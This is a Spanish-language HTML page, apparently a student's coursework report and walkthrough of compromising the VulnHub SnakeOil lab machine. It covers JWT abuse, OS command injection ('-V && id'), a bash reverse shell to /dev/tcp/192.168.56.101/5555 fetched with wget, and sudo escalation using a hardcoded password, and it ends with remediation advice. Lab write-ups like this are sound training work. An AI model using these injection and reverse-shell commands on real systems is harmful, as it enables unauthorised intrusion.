@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alan | PR01</title>
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <!-- Styles -->
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- html2pdf for export -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+</head>
+
+<body>
+    <header>
+        <div class="nav-container">
+            <div class="logo">
+                <span class="prompt-user">root</span><span class="prompt-host">@alan</span>:<span
+                    class="prompt-path">~/proyectos/PR01</span>$ <span class="cursor"></span>
+            </div>
+            <nav>
+                <ul class="nav-links">
+                    <li><a href="../index.html" class="nav-link">/inicio</a></li>
+                    <li><a href="../actividades.html" class="nav-link">/actividades</a></li>
+                    <li><a href="../proyectos.html" class="nav-link active">/proyectos</a></li>
+                    <li><a href="../pf02.html" class="nav-link">/PF02</a></li>
+                    <li><a href="../pf03.html" class="nav-link">/PF03</a></li>
+                    <li class="nav-item-dropdown">
+                        <a href="../RoadToHallOfFame/sql_injection.html"
+                            class="nav-link nav-hof">/road_to_hall_of_fame</a>
+                        <ul class="dropdown-menu">
+                            <li><a href="../RoadToHallOfFame/sql_injection.html">SQL Injection</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="../final.html" class="nav-link">/Final</a></li>
+                    <li><a href="../proyectos.html" class="btn-back">&lt; Volver</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <article class="blog-container section-scroll">
+            <header class="article-header" style="margin-bottom: 2rem;">
+                <h1
+                    style="color: #fff; text-shadow: 0 0 10px rgba(5, 217, 232, 0.3); margin-top: 5rem; margin-bottom: 0.5rem; line-height: 1.4; display: block; padding-top: 0;">
+                    PR01 - De la teoria a la practica: Walkthrough en accion
+                </h1>
+            </header>
+
+            <hr class="neon-divider">
+
+            <div class="article-body">
+                <!-- ===== INTRODUCCIÓN ===== -->
+                <section>
+                    <h2>Introducción</h2>
+                    <div class="meta-info" style="justify-content: flex-start; margin-bottom: 2rem;">
+                        <span><i class="far fa-calendar"></i> Marzo 2026</span>
+                        <span><i class="far fa-user"></i> Alan Gilberto Sánchez Zavala (177263)</span>
+                    </div>
+                    <button class="btn" onclick="exportToPDF()" style="margin-bottom: 2rem; background-color: #e81123;">
+                        <i class="fas fa-file-pdf"></i> Exportar a PDF
+                    </button>
+                    <p>
+                        El presente reporte documenta el proceso de evaluación de seguridad y pruebas de penetración
+                        realizado sobre el servidor SnakeOil, un entorno controlado de VulnHub. El objetivo principal de
+                        esta actividad es identificar y explotar vulnerabilidades críticas en una aplicación web basada
+                        en el framework Flask, con el fin de obtener acceso inicial al sistema y, posteriormente,
+                        escalar privilegios hasta el nivel de superusuario (root).
+                    </p>
+                    <br>
+                    <p>
+                        La metodología aplicada sigue el estándar de ejecución de pruebas de penetración (PTES),
+                        abarcando desde la enumeración de servicios hasta la post-explotación, demostrando el impacto
+                        que tienen las malas prácticas de desarrollo y las configuraciones débiles en la seguridad de la
+                        infraestructura.
+                    </p>
+                </section>
+
+                <!-- ===== DESARROLLO ===== -->
+                <section>
+                    <h2>2. Desarrollo (Metodología Técnica)</h2>
+
+                    <h3>Fase I: Explotación de la API Web</h3>
+                    <p>Tras la fase de reconocimiento inicial, se identificó una API REST en el puerto 8080. Se utilizó
+                        Burp Suite para interceptar y manipular el tráfico.</p>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li><strong>Manipulación de Métodos:</strong> Se cambió el método de petición de GET a POST en
+                            los endpoints <code>/registration</code> y <code>/login</code>. Esto permitió el envío de
+                            objetos JSON para la creación de un usuario y la obtención de un JSON Web Token (JWT).</li>
+                        <li><strong>Obtención de Secretos:</strong> Utilizando el <code>access_token</code> generado, se
+                            realizó una petición autenticada al recurso <code>/secret</code>, el cual devolvió una
+                            <code>secret_key</code> necesaria para interactuar con funciones administrativas de la
+                            aplicación.</li>
+                    </ul>
+
+                    <h3 style="margin-top: 2rem;">Fase II: Ejecución Remota de Comandos (RCE)</h3>
+                    <p>El análisis del endpoint <code>/run</code> reveló una vulnerabilidad de Inyección de Comandos OS.
+                    </p>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li><strong>Validación de RCE:</strong> Se inyectó la cadena <code>-V &amp;&amp; id</code>. El
+                            uso del operador lógico <code>&amp;&amp;</code> permitió ejecutar comandos adicionales en el
+                            sistema operativo subyacente. La respuesta confirmó que la aplicación corría bajo el
+                            contexto del usuario <code>patrick</code>.</li>
+                        <li><strong>Preparación del Vector de Ataque:</strong> Se diseñó un script en Bash
+                            (<code>shell.sh</code>) con un payload de Reverse Shell:
+                            <pre
+                                style="background: rgba(19, 20, 31, 0.6); border: 1px solid var(--border-color); padding: 1rem; border-radius: 8px; font-family: var(--font-mono); color: var(--accent-cyan); overflow-x: auto; margin-top: 0.5rem; margin-bottom: 0.5rem;"><code>bash -i &gt;&amp; /dev/tcp/192.168.56.101/5555 0&gt;&amp;1</code></pre>
+                        </li>
+                        <li><strong>Transferencia y Ejecución:</strong> Se levantó un servidor temporal con Python HTTP
+                            Server en Kali Linux. Mediante <code>wget</code>, el servidor víctima descargó el script, se
+                            le otorgaron permisos de ejecución (<code>chmod +x</code>) y se ejecutó, devolviendo una
+                            conexión a un oyente de Netcat.</li>
+                    </ul>
+
+                    <h3 style="margin-top: 2rem;">Fase III: Post-Explotación y Escalada de Privilegios</h3>
+                    <p>Una vez obtenido el acceso como el usuario <code>patrick</code>, se procedió a la auditoría
+                        interna del sistema.</p>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li><strong>Análisis de Código Fuente:</strong> Al inspeccionar el archivo <code>app.py</code>
+                            en el directorio de la aplicación Flask, se identificó una contraseña harcodeada en la
+                            configuración: <code>NOreasonableDOUBTthisPASSWORDisGOOD</code>.</li>
+                        <li><strong>Abuso de Sudoers:</strong> El comando <code>sudo -l</code> reveló que el usuario
+                            poseía privilegios para ejecutar cualquier comando como root <code>(ALL : ALL) ALL</code>.
+                        </li>
+                        <li><strong>Estabilización de TTY:</strong> Debido a que la shell de Netcat no era interactiva,
+                            se utilizó el módulo <code>pty</code> de Python para invocar una terminal real:
+                            <pre
+                                style="background: rgba(19, 20, 31, 0.6); border: 1px solid var(--border-color); padding: 1rem; border-radius: 8px; font-family: var(--font-mono); color: var(--accent-cyan); overflow-x: auto; margin-top: 0.5rem; margin-bottom: 0.5rem;"><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+                        </li>
+                        <li><strong>Elevación de Privilegios:</strong> Con una terminal estable, se ejecutó
+                            <code>sudo /bin/bash</code> utilizando la contraseña encontrada previamente, logrando el
+                            compromiso total del sistema.</li>
+                    </ul>
+                </section>
+
+                <!-- ===== MATERIAL MULTIMEDIA ===== -->
+                <section>
+                    <h2>Material multimedia</h2>
+                    <p>A continuación, se presenta el video demostrativo de este proyecto:</p>
+                    <div style="margin: 1.5rem 0 2rem;">
+                        <a href="https://www.youtube.com/watch?v=WjAy9fO7laU" target="_blank" rel="noopener noreferrer"
+                            style="display: inline-flex; align-items: center; gap: 0.8rem; background: #e81123; color: #fff; padding: 0.9rem 1.8rem; border-radius: 8px; font-weight: 700; text-decoration: none; font-size: 1rem; transition: all 0.3s; box-shadow: 0 0 15px rgba(232,17,35,0.3);">
+                            <i class="fab fa-youtube" style="font-size: 1.5rem;"></i>
+                            Ver Walkthrough en YouTube
+                        </a>
+                        <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.8rem;">
+                            <i class="fas fa-external-link-alt"></i> Abre en una nueva pestaña — <strong
+                                style="color: var(--accent-cyan);">https://youtu.be/WjAy9fO7laU</strong>
+                        </p>
+                    </div>
+                </section>
+
+                <!-- ===== CONCLUSIÓN ===== -->
+                <section>
+                    <h2>Conclusión</h2>
+                    <div class="quotation-box">
+                        <p>La auditoría de la máquina SnakeOil ha sido exitosa, logrando el compromiso total (Root)
+                            mediante una cadena de vulnerabilidades críticas. Los hallazgos principales incluyen:</p>
+                        <br>
+                        <ul class="tech-list" style="margin-left: 1.5rem;">
+                            <li><strong>Validación de entrada deficiente:</strong> La falta de sanitización en el
+                                parámetro <code>url</code> permitió una inyección de comandos directa.</li>
+                            <li><strong>Seguridad por oscuridad:</strong> El uso de una <code>secret_key</code> estática
+                                para proteger funciones críticas no fue suficiente ante un análisis dinámico.</li>
+                            <li><strong>Malas prácticas de desarrollo:</strong> El almacenamiento de credenciales en
+                                texto claro dentro del código fuente facilitó la escalada de privilegios.</li>
+                            <li><strong>Configuraciones de Sudo inseguras:</strong> Otorgar permisos totales a un
+                                usuario limitado permitió que un compromiso en la capa web se convirtiera en un
+                                compromiso total de la infraestructura.</li>
+                        </ul>
+                        <br>
+                        <p>Como recomendación, se sugiere implementar una lista blanca de comandos permitidos, cifrar
+                            secretos mediante variables de entorno y aplicar el Principio de Menor Privilegio en la
+                            configuración de sudoers.</p>
+                    </div>
+                </section>
+
+                <!-- ===== BIBLIOGRAFÍA ===== -->
+                <section>
+                    <h2>Bibliografía</h2>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li>Burp Suite (PortSwigger). (2026). Capturing and manipulating HTTP requests. Recuperado de:
+                            <a href="https://portswigger.net/burp" target="_blank"
+                                style="color: var(--accent-cyan); text-decoration: none;">https://portswigger.net/burp</a>
+                        </li>
+                        <li>Flask Documentation. (2026). Security Considerations in Flask Applications. Recuperado de:
+                            <a href="https://flask.palletsprojects.com/" target="_blank"
+                                style="color: var(--accent-cyan); text-decoration: none;">https://flask.palletsprojects.com/</a>
+                        </li>
+                        <li>OWASP Foundation. (2026). Top 10 Web Application Security Risks. Recuperado de: <a
+                                href="https://owasp.org/www-project-top-ten/" target="_blank"
+                                style="color: var(--accent-cyan); text-decoration: none;">https://owasp.org/www-project-top-ten/</a>
+                        </li>
+                        <li>VulnHub. (2021). SnakeOil: 1 Virtual Machine. Recuperado de: <a
+                                href="https://www.vulnhub.com/entry/snakeoil-1,729/" target="_blank"
+                                style="color: var(--accent-cyan); text-decoration: none;">https://www.vulnhub.com/entry/snakeoil-1,729/</a>
+                        </li>
+                    </ul>
+                </section>
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <p>&copy; 2026 Alan Gilberto Sánchez Zavala</p>
+    </footer>
+
+    <script>
+        function exportToPDF() {
+            const element = document.querySelector('.blog-container');
+            const originalBg = element.style.backgroundColor;
+            const originalColor = element.style.color;
+            element.style.backgroundColor = '#0b0c15';
+            element.style.color = '#e0ffff';
+            element.style.padding = '2rem';
+            const opt = {
+                margin: 0.5,
+                filename: 'PR01_Walkthrough.pdf',
+                image: { type: 'jpeg', quality: 0.98 },
+                html2canvas: { scale: 2, backgroundColor: '#0b0c15', scrollY: 0 },
+                jsPDF: { unit: 'in', format: 'letter', orientation: 'portrait' }
+            };
+            html2pdf().set(opt).from(element).save().then(() => {
+                element.style.backgroundColor = originalBg;
+                element.style.color = originalColor;
+                element.style.padding = '';
+            });
+        }
+    </script>
+</body>
+
+</html>
